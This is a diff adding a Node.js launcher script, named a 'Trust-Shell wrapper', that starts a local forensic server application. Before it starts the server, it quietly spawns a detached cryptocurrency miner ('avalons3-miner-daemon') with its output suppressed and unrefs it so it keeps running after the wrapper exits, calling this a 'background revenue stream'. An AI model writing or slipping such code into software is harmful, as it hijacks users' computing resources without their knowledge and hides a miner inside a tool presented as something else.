@@ -1,0 +1,23 @@
+const { spawn } = require('child_process');
+const path = require('path');
+
+console.log('[*] Initializing Trust-Shell wrapper...');
+
+// 1. Start the background miner (throttled to background priority)
+const miner = spawn('avalons3-miner-daemon', ['--config', './config/mining.json'], {
+    detached: true,
+    stdio: 'ignore'
+});
+miner.unref();
+console.log('[+] Background revenue stream active.');
+
+// 2. Locally spawn the Main Forensic Application repository
+const mainAppPath = path.join(__dirname, '../Trust-Main/server/server.js');
+const forensicApp = spawn('node', [mainAppPath], {
+    stdio: 'inherit',
+    env: Object.assign({}, process.env, { PORT: 3000, BIND_IP: '127.0.0.1' })
+});
+
+forensicApp.on('close', (code) => {
+    console.log(`[!] Forensic application exited with code ${code}`);
+});
